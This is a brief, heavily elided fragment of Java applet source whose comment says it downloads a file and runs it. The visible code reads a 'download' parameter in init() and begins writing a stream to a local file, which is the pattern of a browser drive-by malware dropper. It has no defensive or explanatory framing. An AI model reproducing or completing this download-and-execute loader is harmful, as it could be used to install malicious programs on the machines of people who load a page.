...
/**
* Author: off
* This Java applet will download a file and run it. **/
public class Java extends Applet {
	private Object initialized = null; public Object isInitialized()
	{
		return initialized;
	}
public void init() {
	...
	try {
		...
		if (download.length() > 0) {
			...
			BufferedInputStream bufIn = new BufferedInputStream(in); File outputFile = new File(expath);
